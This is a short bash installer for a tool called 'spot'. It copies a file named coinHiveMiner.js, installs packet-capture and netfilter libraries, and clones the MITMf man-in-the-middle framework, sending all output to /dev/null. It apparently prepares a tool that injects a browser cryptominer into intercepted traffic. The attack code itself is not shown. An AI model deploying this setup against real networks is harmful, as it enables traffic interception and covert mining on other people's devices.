#!/bin/bash
#Get confirm
echo -e "\E[35mInstallation may take a long time"
read -n1 -p "Do you want to continue? [Y/n]? " confirm; echo
confirm=`echo $confirm | tr '[:upper:]' '[:lower:]'`

#Required entry
until [[ $confirm == "y" ]] || [[ $confirm == "" ]] || [[ $confirm == "n" ]]
do
  read -n1 -p "Enter [Y/n]: " confirm; echo
  confirm=`echo $confirm | tr '[:upper:]' '[:lower:]'`
done

#Start of installation
if [[ $confirm == "y" ]] || [[ $confirm == "" ]]
then
  #For a clean installation, all output is sent to the /dev/null
  echo "Installation..."
  echo "Creating a directory and copying files..."
  sudo mkdir /opt/spot > /dev/null 2>&1
  here=`pwd`
  sudo cp -n $here/coinHiveMiner.js $here/logo.txt $here/gateway.txt $here/interface.txt /opt/spot/
  sudo cp -f $here/spot /usr/local/bin/spot
  sudo chmod +x /usr/local/bin/spot

  #This part takes a long time
  #echo "Updating packages..."
  #sudo apt update > /dev/null 2>&1

  #Pip
  echo "Pip installing..."
  echo -ne '\n' | sudo apt install python-pip > /dev/null 2>&1
  echo "Pip updating..."
  pip install --upgrade pip > /dev/null 2>&1

  #Git and python dependencies
  echo "Installing dependencies..."
  echo -ne '\n' | sudo apt install git python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libxml2-dev libxslt1-dev libffi6 libffi-dev python-magic python-scapy > /dev/null 2>&1
  echo -ne '\n' | sudo pip install dnslib NetfilterQueue ua-parser user-agents capstone pyinotify pycrypto pyasn1 cryptography Pillow netaddr dnslib Twisted lxml pefile ipy user_agents pyopenssl service_identity configobj Flask dnspython beautifulsoup4 msgpack-python requests[security] pypcap chardet bs4 pillow pefile > /dev/null 2>&1

  #MITMf
  echo "Installing MITMf..."
  cd /opt
  sudo git clone https://github.com/byt3bl33d3r/MITMf > /dev/null 2>&1
  cd /opt/MITMf && sudo git submodule init > /dev/null 2>&1 && sudo git submodule update --recursive > /dev/null 2>&1

  #Removing garbage
  echo "Cleaning..."
  echo -ne '\n' | sudo apt get autoremove > /dev/null 2>&1

  echo "Now you can remove this directory and use spot!"
else
  echo -e "\e[35mExit..."
  exit 0
fi
tput sgr0
